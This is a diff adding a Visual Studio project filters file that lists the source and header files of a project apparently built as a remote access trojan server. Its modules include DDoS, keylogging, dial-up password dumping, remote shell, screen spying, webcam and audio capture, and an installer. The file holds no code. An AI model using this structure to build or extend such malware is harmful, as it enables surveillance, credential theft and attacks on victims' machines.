@@ -1,0 +1,227 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup>
+    <Filter Include="Source Files">
+      <UniqueIdentifier>{8f67ca9e-6759-48a7-a0e6-51d5d6e5649a}</UniqueIdentifier>
+      <Extensions>cpp;c;cxx;rc;def;r;odl;idl;hpj;bat</Extensions>
+    </Filter>
+    <Filter Include="Header Files">
+      <UniqueIdentifier>{13bcda7a-c4d6-4dca-865f-52e5482ffe02}</UniqueIdentifier>
+      <Extensions>h;hpp;hxx;hm;inl</Extensions>
+    </Filter>
+    <Filter Include="Resource Files">
+      <UniqueIdentifier>{35e9cfd6-7947-4693-b8f0-4cf373ea7f5a}</UniqueIdentifier>
+      <Extensions>ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe</Extensions>
+    </Filter>
+  </ItemGroup>
+  <ItemGroup>
+    <ClCompile Include="..\common\AudioCode.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="common\AudioManager.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="common\Buffer.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="ClientSocket.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="common\DDOSManager.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="common\Dialupass.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="common\FileManager.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="common\install.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="common\KernelManager.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="common\KeyboardManager.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="common\Manager.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="Myfunction.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="common\RegEditEx.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="common\RegeditOpt.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="common\Registry.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="common\RegManager.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="common\ScreenManager.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="common\ScreenSpy.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="common\SerManager.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="Server.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="common\ServerStart.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="common\ShellManager.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="StdAfx.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="common\SystemManager.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="common\until.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="common\VideoCap.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="common\VideoManager.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="common\WaveIn.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="common\WaveOut.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+  </ItemGroup>
+  <ItemGroup>
+    <ResourceCompile Include="Server.rc">
+      <Filter>Source Files</Filter>
+    </ResourceCompile>
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="..\common\AudioCode.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="common\AudioManager.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="common\Buffer.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="ClientSocket.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="..\common\CursorInfo.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="common\DDOSManager.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="Declare.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="common\Dialupass.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="common\FileManager.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="common\install.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="common\KernelManager.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="common\KeyboardManager.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="common\keylog.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="common\login.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="common\loop.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="..\common\macros.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="common\Manager.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="Myfunction.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="common\RegEditEx.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="common\RegeditOpt.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="common\Registry.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="common\RegManager.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="common\ScreenManager.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="common\ScreenSpy.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="common\SerManager.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="common\ServerStart.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="common\ShellManager.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="StdAfx.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="common\SystemManager.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="common\tou.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="common\until.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="common\VideoCap.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="..\common\VideoCodec.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="common\VideoManager.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="common\WaveIn.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="common\WaveOut.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+  </ItemGroup>
+  <ItemGroup>
+    <CustomBuild Include="res\Server.ico">
+      <Filter>Resource Files</Filter>
+    </CustomBuild>
+    <CustomBuild Include="ReadMe.txt" />
+  </ItemGroup>
+</Project>
